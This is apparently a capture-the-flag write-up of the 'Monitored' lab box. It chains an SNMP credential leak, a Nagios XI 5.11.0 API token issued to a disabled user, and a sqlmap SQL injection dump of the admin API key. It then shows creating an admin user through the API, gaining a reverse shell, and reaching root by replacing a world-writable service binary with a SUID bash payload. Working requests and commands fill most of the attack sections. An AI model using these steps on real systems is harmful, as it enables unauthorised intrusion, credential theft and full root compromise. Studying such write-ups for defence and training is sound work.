#Linux #SNMP #NagiosXI #SQLi #SQLMap #APIAbuse #credentialhunting #SUIDBinary #ServiceFileWrite #rootbash #verbtampering

## Overview

Monitored is a medium Linux box running Nagios XI 5.11.0. SNMP leaks credentials for a disabled Nagios account. The Nagios API's authenticate endpoint still issues tokens for disabled users via a verb-tampered POST request; that token grants access to an authenticated SQLi in the admin banner endpoint. SQLMap dumps the admin API key, which is used to create a new admin account. The foothold comes via a Nagios custom command. Root is achieved by replacing the `nagios` binary (world-writable) with a SUID rootbash script, then restarting the service through a legitimately sudo-able management script.

## Recon

Port 80 redirected to `https://nagios.monitored.htb/`. SSL certificate enumeration yielded the email `support@monitored.htb`. GoBuster found the `/nagios` path requiring authentication.

UDP SNMP was open. Walking it:

```sh
snmpwalk -v2c -c public 10.129.x.x
iso.3.6.1.2.1.25.4.2.1.5.611 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
```

> **SNMP process args as a credential oracle:** the `hrSWRunParameters` OID stores full command-line arguments. A monitoring script running with credentials as CLI flags exposes them to any SNMP reader. The value here gives the `svc` account password directly.

Credentials: `svc:XjH7VCehowpR1xZB`

These failed at the Nagios web login because `svc` is disabled in Nagios.

## Foothold

### Nagios API, Verb Tampering to Get a Token

The Nagios XI API authenticates at `/nagiosxi/api/v1/authenticate`. Visiting it by GET returns "You can only use POST with authenticate." Intercepting in Burp and converting to POST with credentials in the body:

```http
POST /nagiosxi/api/v1/authenticate HTTP/1.1
Host: nagios.monitored.htb
Content-Type: application/x-www-form-urlencoded

username=svc&password=XjH7VCehowpR1xZB
```

Response:

```json
{
  "username":"svc","user_id":"2",
  "auth_token":"904e5b9e84cc918c445245b8a0c0c70815399e1e",
  "valid_min":5,"valid_until":"..."
}
```

> **Why the API issues tokens for disabled users:** the API authentication endpoint validates the username and password against the database but does not check the `enabled` flag at token issuance. The UI login does check it. This inconsistency gives API access to accounts that appear locked out of the web interface.

Using the token as a URL parameter to access the dashboard:

```
https://nagios.monitored.htb/nagiosxi/?token=904e5b9e84cc918c445245b8a0c0c70815399e1e
```

Version discovered in the UI: **Nagios XI 5.11.0**

### SQL Injection → Admin API Key

Nagios XI 5.11.0 has a SQLi in the admin banner acknowledgment endpoint. The `id` parameter is injectable:

```http
POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1
Cookie: nagiosxi=<session>
Content-Type: application/x-www-form-urlencoded

action=acknowledge_banner_message&id=3'
```

Response confirmed injection:

```
SQL Error [nagiosxi] : You have an error in your SQL syntax; check the manual...
```

SQLMap against the endpoint to dump the `xi_users` table:

```sh
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" \
  --data="id=3&action=acknowledge_banner_message" -p id \
  --cookie "nagiosxi=<session>" --batch --threads 10 -D nagiosxi -T xi_users --dump
```

Output included the admin API key:

```
nagiosadmin | api_key: IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
```

### API Admin User Creation → Nagios RCE

The admin API key unlocks the `/system/user` endpoint. Referencing an old exploit (EDB-44560) for the user creation parameter format:

```http
POST /nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=evil&password=password1&name=evil&email=evil@monitored.htb&auth_level=admin&force_pw_change=0
```

```json
{"success":"User account evil was added successfully!","user_id":6}
```

Logging in as `evil:password1` granted full Nagios admin access. A custom command was created via Configure > Core Config Manager, then triggered by running it against localhost from the hosts menu. This executed a reverse shell as `nagios`.

## Privilege Escalation

### Writable nagios Binary → rootbash → root

LinPEAS flagged several writable executables called by systemd services:

```
/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable:
/usr/local/nagios/bin/nagios
```

The `nagios` binary was world-writable. The plan: replace it with a script that copies bash and sets the SUID bit, then restart the service using the `manage_services.sh` script (which the nagios user can run via sudo):

```sh
# Back up the real binary
mv /usr/local/nagios/bin/nagios /usr/local/nagios/bin/nagios.bak

# Write the rootbash payload
cat > /usr/local/nagios/bin/nagios << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /usr/local/nagios/bin/nagios

# Restart to trigger execution
sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios
```

The service restart failed (because the fake binary doesn't behave like a daemon), but the payload still ran before exiting:

```sh
ls -lah /tmp/rootbash
-rwsrwsrwx 1 root root 1.2M Sep 27 15:19 /tmp/rootbash
```

```sh
/tmp/rootbash -p
whoami
root
```

> **Why SUID rootbash works with `-p`:** bash's `-p` flag tells it not to reset the effective UID to the real UID, which it normally does as a safety measure. With SUID set (running as root), `-p` preserves that root effective UID, giving a root shell.

## Root

```sh
cat /root/root.txt
‹redacted›
```

## Takeaways

- **SNMP process arguments are a reliable credential source.** Any monitoring or management script that passes secrets via CLI flags exposes them to SNMP readers with the right community string.
- **API authentication and UI authentication can diverge.** Disabled accounts may still receive API tokens if the lockout check is only applied at the web login layer.
- **Authenticated SQLi in a web app often leads to credential or API-key exfiltration**, which then unlocks further admin-level API abuse.
- **World-writable service binaries are root escalation paths.** If a systemd service calls an executable that any user can overwrite, replacing it with a SUID-setting payload and triggering a restart yields root.
